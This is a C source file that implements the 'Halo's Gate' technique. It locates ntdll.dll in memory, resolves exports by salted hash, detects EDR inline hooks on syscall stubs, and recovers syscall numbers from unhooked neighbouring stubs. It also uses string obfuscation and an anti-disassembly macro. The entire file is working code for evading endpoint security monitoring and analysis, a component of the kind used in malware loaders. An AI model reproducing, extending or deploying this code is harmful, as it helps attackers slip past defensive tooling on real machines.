#include "7layers.h"
#include "syscall.h"
#include "scanner.h"
#include "crypto/crypto.h"

// https://github.com/raulm0429/HalosGate-Cpl-C-/blob/main/dllmain.cpp

SYSCALL_STATUS get_ssn_halo_gate(DJB2_HASH* hash, DWORD* ssn) {
    ANTI_DISASM();
    if (ssn == NULL || hash == NULL) { return SYSCALL_INVALID_PARAMETER; }
    PE_CONTEXT* curr = g_PE_HEAD;
    *ssn = 0;

    while (curr) {
        const char* target = OBF("ntdll.dll");
        size_t target_size = c_strlen(target);
        size_t scan_size = c_strlen(curr->name);
        if (target_size != scan_size|| c_memcmp(curr->name, target, scan_size) != 0) {
            PE_CONTEXT* next = curr->NextEntry;
            curr = next;
            continue;
        }
        IMAGE_EXPORT_DIRECTORY* eat = curr->export;
        if (eat == NULL) {
            return SYSCALL_UNKNOWN_ERROR;
        }

        DWORD*  AddressOfFunctions      = (DWORD*)(curr->image + eat->AddressOfFunctions);
        DWORD*  AddressOfNames          = (DWORD*)(curr->image + eat->AddressOfNames);
        WORD*   AddressOfNameOrdinales  = (WORD*)(curr->image + eat->AddressOfNameOrdinals);

        for (int i=0; i < (int)eat->NumberOfNames; i++) {
            if (AddressOfNameOrdinales[i] >= eat->NumberOfFunctions) {
                return SYSCALL_INVALID_PE_CONTEXT;
            }
            char* funcName = (char*)(curr->image + AddressOfNames[i]);
            void* funcAddr = (void*)(curr->image + AddressOfFunctions[AddressOfNameOrdinales[i]]);

            if (djb2_hash((unsigned char*)funcName, hash->salt) == hash->hash) {
                int stub = c_memcmp(funcAddr, (unsigned char*)"\x4C\x8B\xD1\xB8", 4);
                int hook = c_memcmp(funcAddr, (unsigned char*)"\xE9", 1);

                if (stub != 0 && hook != 0) {
                    return SYSCALL_UNKNOWN_ERROR;
                }

                if (stub == 0) {
                    return SYSCALL_FUNCTION_NOT_HOOKED;
                }
                
                for (int j=0; j <= 500; j++) {
                    int neighbor_down     = c_memcmp((void*)funcAddr + j * 32, (unsigned char*)"\x4C\x8B\xD1\xB8", 4);
                    int neighbor_up       = c_memcmp((void*)funcAddr + j * -32, (unsigned char*)"\x4C\x8B\xD1\xB8", 4);

                    if (neighbor_down != 0 || neighbor_up != 0) {
                        continue;
                    }

                    DWORD ssn_down = UINT32_MAX;
                    DWORD ssn_up = UINT32_MAX;

                    BYTE high_down  = *((BYTE*)funcAddr + 5 + j * 32);
                    BYTE low_down   = *((BYTE*)funcAddr + 4 + j * 32);
                    ssn_down = (high_down << 8) | (low_down - j);

                    BYTE high_up    = *((BYTE*)funcAddr + 5 + j * -32);
                    BYTE low_up     = *((BYTE*)funcAddr + 4 + j * -32);
                    ssn_up = (high_up << 8) | (low_up + j);

                    if (ssn_down == UINT32_MAX || ssn_up == UINT32_MAX) {
                        continue;
                    }

                    if (ssn_down != ssn_up) {
                        continue;
                    }

                    *ssn = ssn_down;
                    return SYSCALL_SSN_FOUND;
                }

                return SYSCALL_SSN_NOT_FOUND;
            }
        }

        return SYSCALL_FUNCTION_NOT_FOUND;
    }

    return SYSCALL_MODULE_NOT_FOUND;
}